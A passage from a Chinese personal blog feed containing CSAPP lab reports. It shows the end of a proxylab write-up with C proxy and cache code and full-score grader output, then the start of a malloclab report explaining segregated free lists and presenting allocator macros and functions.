buf, <span class="built_in">strlen</span>(buf));</span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">"Proxy-Connection: close\r\n"</span>);</span><br><span class="line">    Rio_writen(server_fd, buf, <span class="built_in">strlen</span>(buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 转发其他header</span></span><br><span class="line">    <span class="keyword">char</span> key_buf[MAXLINE], value_buf[MAXLINE];</span><br><span class="line">    Rio_readlineb(&amp;client_rio, buf, MAXLINE);</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">strcmp</span>(buf, <span class="string">"\r\n"</span>))</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">sscanf</span>(buf, <span class="string">"%s: %s"</span>, key_buf, value_buf);</span><br><span class="line">        <span class="keyword">int</span> skip = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; kept_headers[i] != <span class="literal">NULL</span>; i++)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">if</span> (strcasecmp(key_buf, kept_headers[i]) == <span class="number">0</span>)</span><br><span class="line">            {</span><br><span class="line">                skip = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span> (!skip)</span><br><span class="line">        {</span><br><span class="line">            Rio_writen(server_fd, buf, <span class="built_in">strlen</span>(buf));</span><br><span class="line">        }</span><br><span class="line">        Rio_readlineb(&amp;client_rio, buf, MAXLINE);</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">// 缓存结果</span></span><br><span class="line">    <span class="keyword">char</span> *data = <span class="built_in">malloc</span>(MAX_OBJECT_SIZE);</span><br><span class="line">    <span class="keyword">int</span> size = <span class="number">0</span>;</span><br><span class="line">    Rio_readinitb(&amp;server_rio, server_fd);</span><br><span class="line">    <span class="keyword">while</span> ((n = Rio_readnb(&amp;server_rio, buf, MAXLINE)) &gt; <span class="number">0</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span> (size + n &lt; MAX_OBJECT_SIZE)</span><br><span class="line">        {</span><br><span class="line">            <span class="built_in">memcpy</span>(data + size, buf, n);</span><br><span class="line">            size += n;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        {</span><br><span class="line">            size = MAX_OBJECT_SIZE + <span class="number">1</span>;</span><br><span class="line">        }</span><br><span class="line">        Rio_writen(client_fd, buf, n);</span><br><span class="line">    }</span><br><span class="line">    cacheData = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(CacheData));</span><br><span class="line">    cacheData-&gt;data = data;</span><br><span class="line">    cacheData-&gt;size = size;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;= MAX_OBJECT_SIZE)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"uri %s is stored into cache\n"</span>, uri);</span><br><span class="line">        store(cache, uri, cacheData);</span><br><span class="line">    }</span><br><span class="line">    Close(server_fd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">parse_porturi</span><span class="params">(<span class="keyword">char</span> *url, <span class="keyword">char</span> *dest, <span class="keyword">char</span> **uri)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="comment">// 默认端口号</span></span><br><span class="line">    <span class="keyword">char</span> *default_port = <span class="string">"80"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在URL中查找协议部分的冒号</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *protocol_end = <span class="built_in">strstr</span>(url, <span class="string">"://"</span>);</span><br><span class="line">    <span class="keyword">if</span> (protocol_end != <span class="literal">NULL</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="comment">// 找到协议部分的冒号</span></span><br><span class="line">        protocol_end += <span class="number">3</span>; <span class="comment">// 移动到协议部分的末尾</span></span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">char</span> *port_start = <span class="built_in">strchr</span>(protocol_end, <span class="string">':'</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (port_start != <span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="comment">// 找到冒号，表示有端口号</span></span><br><span class="line">            <span class="keyword">int</span> port;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">sscanf</span>(port_start + <span class="number">1</span>, <span class="string">"%d"</span>, &amp;port) == <span class="number">1</span>)</span><br><span class="line">            {</span><br><span class="line">                <span class="built_in">sprintf</span>(dest, <span class="string">"%d"</span>, port);</span><br><span class="line">                *uri = <span class="built_in">strchr</span>(protocol_end, <span class="string">'/'</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    *uri = <span class="built_in">strchr</span>(protocol_end, <span class="string">'/'</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(dest, <span class="string">"%s"</span>, default_port);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">thread_once</span><span class="params">(<span class="keyword">void</span> *vargp)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> connfd = *(<span class="keyword">int</span> *)vargp;</span><br><span class="line">    doit(connfd); <span class="comment">/* Service client */</span></span><br><span class="line">    Close(connfd);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">thread</span><span class="params">(<span class="keyword">void</span> *vargp)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    Pthread_detach(pthread_self());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">int</span> connfd = sbuf_remove(&amp;sbuf); <span class="comment">/* Remove connfd from buffer */</span></span><br><span class="line">        doit(connfd);                    <span class="comment">/* Service client */</span></span><br><span class="line">        Close(connfd);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>结果如下：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">*** Basic ***</span><br><span class="line">Starting tiny on 15325</span><br><span class="line">Starting proxy on 20457</span><br><span class="line">1: home.html</span><br><span class="line">   Fetching ./tiny/home.html into ./.proxy using the proxy</span><br><span class="line">   Fetching ./tiny/home.html into ./.noproxy directly from Tiny</span><br><span class="line">   Comparing the two files</span><br><span class="line">   Success: Files are identical.</span><br><span class="line">2: csapp.c</span><br><span class="line">   Fetching ./tiny/csapp.c into ./.proxy using the proxy</span><br><span class="line">   Fetching ./tiny/csapp.c into ./.noproxy directly from Tiny</span><br><span class="line">   Comparing the two files</span><br><span class="line">   Success: Files are identical.</span><br><span class="line">3: tiny.c</span><br><span class="line">   Fetching ./tiny/tiny.c into ./.proxy using the proxy</span><br><span class="line">   Fetching ./tiny/tiny.c into ./.noproxy directly from Tiny</span><br><span class="line">   Comparing the two files</span><br><span class="line">   Success: Files are identical.</span><br><span class="line">4: godzilla.jpg</span><br><span class="line">   Fetching ./tiny/godzilla.jpg into ./.proxy using the proxy</span><br><span class="line">   Fetching ./tiny/godzilla.jpg into ./.noproxy directly from Tiny</span><br><span class="line">   Comparing the two files</span><br><span class="line">   Success: Files are identical.</span><br><span class="line">5: tiny</span><br><span class="line">   Fetching ./tiny/tiny into ./.proxy using the proxy</span><br><span class="line">   Fetching ./tiny/tiny into ./.noproxy directly from Tiny</span><br><span class="line">   Comparing the two files</span><br><span class="line">   Success: Files are identical.</span><br><span class="line">Killing tiny and proxy</span><br><span class="line">basicScore: 40/40</span><br><span class="line"></span><br><span class="line">*** Concurrency ***</span><br><span class="line">Starting tiny on port 12414</span><br><span class="line">Starting proxy on port 22796</span><br><span class="line">Starting the blocking NOP server on port 32913</span><br><span class="line">Trying to fetch a file from the blocking nop-server</span><br><span class="line">Fetching ./tiny/home.html into ./.noproxy directly from Tiny</span><br><span class="line">Fetching ./tiny/home.html into ./.proxy using the proxy</span><br><span class="line">Checking whether the proxy fetch succeeded</span><br><span class="line">Success: Was able to fetch tiny/home.html from the proxy.</span><br><span class="line">Killing tiny, proxy, and nop-server</span><br><span class="line">concurrencyScore: 15/15</span><br><span class="line"></span><br><span class="line">*** Cache ***</span><br><span class="line">Starting tiny on port 23752</span><br><span class="line">Starting proxy on port 26743</span><br><span class="line">Fetching ./tiny/tiny.c into ./.proxy using the proxy</span><br><span class="line">Fetching ./tiny/home.html into ./.proxy using the proxy</span><br><span class="line">Fetching ./tiny/csapp.c into ./.proxy using the proxy</span><br><span class="line">Killing tiny</span><br><span class="line">Fetching a cached copy of ./tiny/home.html into ./.noproxy</span><br><span class="line">Success: Was able to fetch tiny/home.html from the cache.</span><br><span class="line">Killing proxy</span><br><span class="line">cacheScore: 15/15</span><br><span class="line"></span><br><span class="line">totalScore: 70/70</span><br></pre></td></tr></tbody></table></figure>
<h2 id="总结">总结</h2>
<p>完结撒花！终于在 2023 年完成了 CSAPP 这门课的学习！在这门课的学习与实践里，收获还是非常多的。一方面复习了本科学习的专业知识，还从教授的旁征博引中领悟了新的理解；另一方面，在这么多课程学完之后，对计算机系统的认识也有了更清晰的轮廓，有一种计算机大厦落地简称的感觉。细分方向的专业课是计算机系统里小而独立的模块，像计算机组成、操作系统、编译原理等，CSAPP 可以把相关的知识串起来，以程序员的角度，建立起对计算机系统的顶层认识。这也是我觉得这门课的魅力所在。</p>
<p>祝看到这篇博客的朋友们，新年快乐，万事顺意！</p>
<h2 id="参考">参考</h2>
<ul>
<li><a href="https://wdxtub.com/csapp/thin-csapp-9/2016/04/16/">【读薄 CSAPP】玖 并行与同步 | 小土刀 2.0 (wdxtub.com)</a></li>
</ul>
]]></content>
      <categories>
        <category>学习笔记</category>
        <category>体系结构</category>
        <category>csapp</category>
        <category>实验报告</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>体系结构</tag>
        <tag>csapp</tag>
        <tag>实验报告</tag>
      </tags>
  </entry>
  <entry>
    <title>CSAPP-Lab-6 实验报告: malloclab</title>
    <url>/blog/2023/12/29/CSAPP-Lab-6/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>本文介绍了笔者在做 malloclab 一节的实验报告。该 lab 要求使用 C 语言实现动态内存管理功能，即 <code>malloc,free,realloc</code> 三个函数，完成堆上内存的申请与释放。</p>
<span id="more"></span>
<h2 id="理论知识">理论知识</h2>
<h3 id="动态内存管理">动态内存管理</h3>
<p>在程序虚拟内存空间中，栈是由编译器维护的、用于存放局部变量的区域。栈的空间受限，不能用于存储大型对象（linux 栈只有 8MB），而且局部变量随着函数执行完毕自动回收，这使得栈所存储的变量的生命周期也受到了限制。堆是由程序员维护的、用于保存大型对象的区域。在 C 语言中，可以通过 <code>malloc</code> 申请堆内存，<code>free</code> 释放内存。</p>
<p>动态内存管理的核心是一个分配器，处理到来的内存分配请求，需要考虑以下问题：</p>
<ul>
<li>给定一个指针，我们如何知道需要释放多少内存？
<ul>
<li>给块添加头部信息，记录块的大小</li>
</ul></li>
<li>如何记录未分配的块？
<ul>
<li>固定大小的块，可以使用 bitmap 记录</li>
<li>一般而言，通用的、大小不定的块，使用<strong>空闲链表</strong>记录</li>
</ul></li>
<li>实际需要的空间比未分配的空间要小的时候，剩下的空间怎么办？
<ul>
<li>如果剩余大小大于一定阈值，将其拆分，否则整块返回</li>
</ul></li>
<li>如果有多个区域满足条件，如何选择？
<ul>
<li>首次适应、下一次适应等<strong>分配算法</strong></li>
</ul></li>
<li>释放空间之后如何进行记录？
<ul>
<li>将首部的空闲 bit 置 1</li>
</ul></li>
</ul>
<p>这些问题的核心在于，空闲链表如何组织，以及分配算法怎样选取。</p>
<p>空闲链表有以下几种组织方式：</p>
<p><strong>隐式空闲链表</strong>，如下图所示。每个块的首部记录了块大小以及空闲标记，相当于使用数组实现的单向链表，同时包含了空闲块和非空闲块。这种方式下，<code>malloc</code> 需要从第一个块开始遍历，最坏 O (n) 才能找到合适的块，n 为块的数量。<code>free</code> 时需要与左右的空闲块合并，左侧的块也需要从头开始遍历才能访问到，也需要 O (n) 时间，性能很差。</p>
<p><img src="implicit_list.png"></p>
<p><strong>显式空闲链表</strong>，如下图所示。思想是在空闲块中添加前后向指针，指向相邻的空闲块，得到了显式的空闲链表。这样就可以减少 <code>malloc</code> 的复杂度为 O (f)，f 为空闲块的数量。在空闲块的末尾，添加了一个尾部记录了块的大小，并在每个块的首部记录了前一个块是否空闲，这样可以在 O (1) 的时间内完成相邻空闲块的合并。</p>
<p><img src="explicit_block.png"></p>
<p><img src="explicit_list.png"></p>
<p><strong>分隔空闲链表</strong>，在显式空闲链表的基础上，根据空闲块的大小，拆分到不同的链表中。当新请求到来时，只需要在满足大小的链表中搜索即可，进一步减少了 <code>malloc</code> 的常数。</p>
<h3 id="malloc">malloc</h3>
<p><code>malloc</code> 的原型为：</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">malloc</span><span class="params">(<span class="keyword">size_t</span> __size)</span></span></span><br></pre></td></tr></tbody></table></figure>
<p>malloc () 并不是系统调用，而是 C 语言库函数，内部通过 <code>brk</code> 或者 <code>mmap</code> 的系统调用来扩展虚拟内存空间。<code>malloc</code> 使用了显式空闲链表的方法，块的结构如下所示：</p>
<p><img src="malloc_chunk.png"></p>
<p>不同的是，空闲块没有记录尾部，而是在首部新加了一个字段存储前一个块的大小。由于 <code>malloc</code> 返回的地址总是 8 字节对齐的，因此块的大小也会对齐到 8 的整数倍。这意味着 size 的后 3 位永远是 0，这里就是使用了这三位来存储额外的信息：块属于主分配区或者非主分配区（A），前一个块是否空闲（P），从哪个内存区域获得的虚拟内存（M）。这些空闲块构成了内存池，当新请求到来时，<code>malloc</code> 会尝试先从内存池分配，如果分配成功就无需系统调用，失败则再通过 <code>brk</code> 或者 <code>mmap</code> 调用申请内存。<code>free</code> 时同理，先归还到内存池，当堆顶空闲内存超出阈值时，再通过 <code>sbrk</code> 归还给系统。</p>
<p>malloc 的详细介绍可以参考 <a href="https://jacktang816.github.io/post/mallocandfree/">malloc 和 free 的实现原理解析 - JackTang's Blog (jacktang816.github.io)</a>。值得注意的是，<code>malloc</code> 只申请了虚拟内存，也就是说，操作系统仅为这些地址创建了页表项，但没有将它们与物理地址关联起来。当这些内存被访问到之后，才会触发缺页异常，申请物理内存。</p>
<h2 id="代码实现">代码实现</h2>
<h3 id="思路">思路</h3>
<p>我使用了隔离显式空闲链表的方法，使用多个空闲链表存储不同大小的空闲块，<code>malloc</code> 时只需要在<span class="math inline"> \(\ge size\)</span> 的链表中查找，来达到减小常数的效果。在块内部的 header 中，存储大小、本块与前一个块的空闲信息。在空闲块里，额外存储指向空闲链表前驱和后继的指针。</p>
<p>这个大思路下，两个重要的问题是，空闲链表与大小的关系如何映射，空闲链表的头部存储在哪里？对于第一个问题，我参考 linux 的伙伴系统，不同链表存储的块大小呈倍数关系，例如第一条链存 [8,16) Bytes 的块，第二条链存 [16,32) Bytes 的块，以此类推。这样的优点是，链表的数量不会太多，最多只有<span class="math inline"> \(O(logn)\)</span> 条链，缺点是不同链的块数量不够均匀。第二个问题，我选择存储在了堆的首部，在 <code>mm_init</code> 时对其初始化。</p>
<p>思路确定好之后，可以先拆分一些小的宏函数，来实现常用的功能。</p>
<h3 id="宏定义">宏定义</h3>
<p>我将常用操作封装了很多宏函数，如下所示。这些宏函数的命名都很直观，例如 <code>HEADER</code> 用于读取块的头部信息，<code>HAS_PRED_BLOCK</code> 是判断一个块有没有前向相邻的块（是否达到了边界）、<code>SUCC_BLOCK</code> 用于获取后一个块的起始地址。这些宏是随着代码的编写逐渐补充的。</p>
<p>与函数相比，宏在预处理期被展开，没有函数调用的开销，相当于被内联的函数，适合封装一些指针运算逻辑，这些代码往往需要复用。由于宏的可读性差、参数类型不直观、容易出现优先级问题，不推荐封装很复杂的逻辑。在我的实践中，也是针对参数类型取不同的名字，例如 <code>header_p</code> 意味着一个 <code>header *</code> 的参数，<code>address</code> 代表 <code>void *</code> 等，来避免类型误用的问题。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">/* single word (4) or double word (8) alignment */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ALIGNMENT 8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* rounds up to the nearest multiple of ALIGNMENT */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ALIGN(size) (((size) + (ALIGNMENT - 1)) &amp; ~0x7)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIZE_T_SIZE (ALIGN(sizeof(size_t)))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> header_t size_t</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HEADER_T_SIZE SIZE_T_SIZE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> footer_t header_t</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FOOTER_T_SIZE HEADER_T_SIZE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> uint32 unsigned long</span></span><br><span class="line"><span class="comment">// 空闲链表的数量</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SEG_TABLE_SIZE 16</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 最小块与最小空闲块的大小</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MIN_BLOCK_SIZE HEADER_T_SIZE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MIN_FREE_BLOCK_SIZE 24 <span class="comment">// 8+4+4+8</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 隔离表的起始位置</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> **seg_table;</span><br><span class="line"><span class="comment">// 块的起始边界</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> *block_start;</span><br><span class="line"><span class="comment">// flag的偏移</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FREE_BIT 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRED_FREE_BIT 1</span></span><br><span class="line"><span class="comment">// 读取header信息</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HEADER(address) (*(header_t *)(address))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FOOTER(address) (HEADER(address))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GET_OPTIONS(header) ((header) &amp; (ALIGNMENT - 1))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GET_SIZE(header) ((header)-GET_OPTIONS(header))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GEN_HEADER(size, free, pred_free) ((size) | ((free) &lt;&lt; (FREE_BIT)) | ((pred_free) &lt;&lt; (PRED_FREE_BIT)))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_FREE(header) (((header)) &amp; (1 &lt;&lt; FREE_BIT))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_PRED_FREE(header) ((header) &amp; (1 &lt;&lt; PRED_FREE_BIT))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 前后边界信息</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HAS_PRED_BLOCK(address) ((uint32)(address) &gt; (uint32)block_start)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SUCC_BLOCK(address) ((void *)((char *)(address) + GET_SIZE(HEADER(address))))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HAS_SUCC_BLOCK(address) ((uint32)SUCC_BLOCK(address) &lt; (uint32)mem_heap_hi())</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置header字段</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SET_SIZE(header_p, size) (*(header_p) = (size) | GET_OPTIONS(*(header_p)))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SET_FREE(header_p) (*(header_p) |= (1 &lt;&lt; FREE_BIT))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SET_PRED_FREE(header_p) (*(header_p) |= (1 &lt;&lt; PRED_FREE_BIT))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SET_BUSY(header_p) (*(header_p) &amp;= ~(1 &lt;&lt; FREE_BIT))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SET_PRED_BUSY(header_p) (*(header_p) &amp;= ~(1 &lt;&lt; PRED_FREE_BIT))</span></span><br><span class="line"><span class="comment">// 空闲块的前驱、后继指针的偏移量</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PREV_OFFSET HEADER_T_SIZE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NEXT_OFFSET (HEADER_T_SIZE + sizeof(void *))</span></span><br><span class="line"><span class="comment">// 获取指向prev和next的指针, aka, void **</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PPREV(address) ((void **)((char *)(address) + PREV_OFFSET))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PNEXT(address) ((void **)((char *)(address) + NEXT_OFFSET))</span></span><br></pre></td></tr></tbody></table></figure>
<h3 id="mm_init">mm_init</h3>
<p>申请一块内存用于存储隔离空闲链表的头部 <code>seg_table</code>，并初始化。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * mm_init - initialize the malloc package.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mm_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    seg_table = mem_heap_hi();</span><br><span class="line">    mem_sbrk(SEG_TABLE_SIZE * <span class="keyword">sizeof</span>(<span class="keyword">void</span> *));</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SEG_TABLE_SIZE; i++)</span><br><span class="line">    {</span><br><span class="line">        seg_table[i] = <span class="literal">NULL</span>;</span><br><span class="line">    }</span><br><span class="line">    block_start = seg_table + SEG_TABLE_SIZE;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h3 id="mm_malloc">mm_malloc</h3>
<p>优先从空闲块中查找<span class="math inline"> \(\ge size\)</span> 的块，采用首次适应的策略，若：</p>
<ul>
<li>查找失败，则通过 <code>mem_sbrk</code> 申请新内存</li>
<li>查找成功，选择是否对块进行拆分，返回 </li>
</ul>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * mm_malloc - Allocate a block. If no free blocks satisfying the size, allocate a new one by incrementing the brk pointer.</span></span><br><span class="line"><span class="comment"> *     Always allocate a block whose size is a multiple of the alignment.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mm_malloc</span><span class="params">(<span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> newsize = ALIGN(size + SIZE_T_SIZE);</span><br><span class="line">    <span class="keyword">void</span> *address = fetch_free_block_ge(newsize);</span><br><span class="line">    <span class="keyword">if</span> (address != <span class="literal">NULL</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">void</span> *)((<span class="keyword">char</span> *)address + SIZE_T_SIZE);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">void</span> *p = mem_sbrk(newsize);</span><br><span class="line">    <span class="keyword">if</span> (p == (<span class="keyword">void</span> *)<span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">        *(<span class="keyword">size_t</span> *)p = newsize;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">void</span> *)((<span class="keyword">char</span> *)p + SIZE_T_SIZE);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>这段代码的核心在于 <code>fetch_free_block_ge</code> 函数，代码如下。它的逻辑为，先获取 size 对应的空闲链表，依次向后遍历，直到找到一个大小符合的空闲块。通过 <code>remove_free_block</code> 函数将其从空闲链表移除，<code>split_block</code> 函数对其进行拆分。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief 获取一个大于或等于给定大小的空闲块</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param size </span></span><br><span class="line"><span class="comment"> * @return void* </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">fetch_free_block_ge</span><span class="params">(<span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> index = get_seg_index(size);</span><br><span class="line">    <span class="keyword">size_t</span> bsize;</span><br><span class="line">    <span class="keyword">for</span> (; index &lt; SEG_TABLE_SIZE; index++)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">void</span> *address = seg_table[index]; address != <span class="literal">NULL</span>; address = *PNEXT(address))</span><br><span class="line">        {</span><br><span class="line">            bsize = GET_SIZE(HEADER(address));</span><br><span class="line">            <span class="keyword">if</span> (bsize &gt;= size)</span><br><span class="line">            {</span><br><span class="line">                remove_free_block(address);</span><br><span class="line">                split_block(address, size);</span><br><span class="line">                SET_BUSY((<span class="keyword">header_t</span> *)address);</span><br><span class="line">                <span class="keyword">if</span> (HAS_SUCC_BLOCK(address))</span><br><span class="line">                {</span><br><span class="line">                    SET_PRED_BUSY((<span class="keyword">header_t</span> *)SUCC_BLOCK(address));</span><br><span class="line">                }</span><br><span class="line">                <span class="keyword">return</span> address;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>代码中用到的工具函数代码如下。需要注意的是，在 <code>remove_free_block</code> 中，由于空闲块的前驱可能是链头，不是常规的空闲块，二者的读写模式有所差异，需要做区分。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief 获取 size 对应的空闲链表索引</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param size</span></span><br><span class="line"><span class="comment"> * @return int</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_seg_index</span><span class="params">(<span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> index = SEG_TABLE_SIZE - <span class="number">1</span>; index &gt;= <span class="number">0</span>; index--)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span> (size &gt;= (MIN_BLOCK_SIZE &lt;&lt; index))</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">return</span> index;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"get_seg_index ERROR! size %zu\n"</span>, size);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief 将空闲块从空闲链表中删除</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param address</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">remove_free_block</span><span class="params">(<span class="keyword">void</span> *address)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">header_t</span> cur_header = HEADER(address);</span><br><span class="line">    <span class="keyword">size_t</span> size = GET_SIZE(cur_header);</span><br><span class="line">    <span class="keyword">int</span> index = get_seg_index(size);</span><br><span class="line">    <span class="keyword">void</span> **pprev = PPREV(address);</span><br><span class="line">    <span class="keyword">void</span> **pnext = PNEXT(address);</span><br><span class="line">    <span class="keyword">void</span> **seg_head = seg_table + index;</span><br><span class="line">    <span class="keyword">if</span> (*seg_head == address)</span><br><span class="line">    {</span><br><span class="line">        *seg_head = *pnext;</span><br><span class="line">        <span class="keyword">if</span> (*pnext != <span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            *PPREV(*pnext) = seg_head;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">        *PNEXT(*pprev) = *pnext;</span><br><span class="line">        <span class="keyword">if</span> (*pnext != <span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            *PPREV(*pnext) = *pprev;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span 